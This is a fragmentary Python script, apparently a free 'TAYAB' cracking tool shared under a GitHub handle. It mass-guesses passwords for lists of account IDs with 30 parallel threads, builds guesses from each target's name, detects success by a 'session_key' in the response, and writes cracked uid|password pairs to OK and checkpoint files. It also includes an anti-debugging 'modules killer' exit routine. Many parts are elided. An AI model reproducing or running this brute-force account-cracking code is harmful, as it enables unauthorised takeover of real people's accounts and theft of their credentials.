...
def clr():
    try:
        ...
        if 'Android' in data:
            print(' \033[1;32m[!] DONT TRY AGAIN ITS TAYAB ');exit()
        else:exit()
    except:exit()
####### MODULES KILLER #######
...
loop=0
logo=("""\033[1;37m 
  d888888b  .d8b.  db    db  .d8b.  d8888b. 
`~~88~~' d8' `8b `8b  d8' d8' `8b 88  `8D 
   88    88ooo88  `8bd8'  88ooo88 88oooY' 
   88    88~~~88    88    88~~~88 88~~~b. 
   88    88   88    88    88   88 88   8D 
   YP    YP   YP    YP    YP   YP Y8888P'
====================================================
[â€¢] OWNER      : NASIR ABAS
[â€¢] GITHUB     : TAYAB-KHAN
[â€¢] STATUS     : FREE
...
def file_crack():
	...
	with tred(max_workers=30) as TAYAB:
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				TAYAB.submit(api1,ids,names,passlist)
			else:
				TAYAB.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[ TAYAB ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[TAYAB-OK] '+uid+' | '+pas)		                    
					...
					#	print(f'\r\r\33[1m\33[1;35m [TAYAB-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'TAYAB-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[ TAYAB-M1 ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					print('\r\r\033[1;32m [TAYAB-OK] '+uid+' | '+pas)
					linex()
					file_path = os.path.join(folder_path, 'TAYAB_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
